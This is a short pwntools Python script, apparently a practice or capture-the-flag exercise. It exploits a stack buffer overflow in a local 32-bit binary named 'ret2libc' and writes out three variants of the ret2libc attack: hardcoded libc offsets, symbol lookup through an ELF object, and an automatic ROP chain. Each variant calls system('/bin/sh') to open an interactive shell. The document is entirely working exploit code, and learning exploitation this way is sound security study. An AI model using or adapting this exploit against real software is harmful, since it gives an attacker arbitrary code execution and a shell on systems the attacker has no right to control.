from pwn import *

libc_path = '/lib32/libc.so.6' 
libc_base = 0xf7dbc000 #ldd ret2libc

offset = 33
nop = asm('nop')

p = process('./ret2libc')

#v1 (manually)
'''
system = libc_base + 0x44cc0 #readelf -s /lib32/libc.so.6 | grep system 
binsh = libc_base + 0x18fb62 #strings -a -t x /lib32/libc.so.6 | grep "/bin/sh"

payload = b''.join(
	[
		nop * offset, 
		p32(system), 
		p32(0),
		p32(binsh)
	]
)

p.sendline(payload)
p.interactive()
'''

#v2 (with ELF object "dynamically")
'''
libc = ELF(libc_path)
#libc.address = libc_base #weird bug?

system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))

payload = b''.join(
	[
		nop * offset, 
		p32(system), 
		p32(0),
		p32(binsh)
	]
)

p.sendline(payload)
p.interactive()
'''

#v3 (with ROP object from pwntools)
libc = ELF(libc_path)
libc.address = libc_base

rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh\x00')))

payload = b''.join(
	[
		nop * offset, 
		rop.chain()
	]
)

p.sendline(payload)
p.interactive()

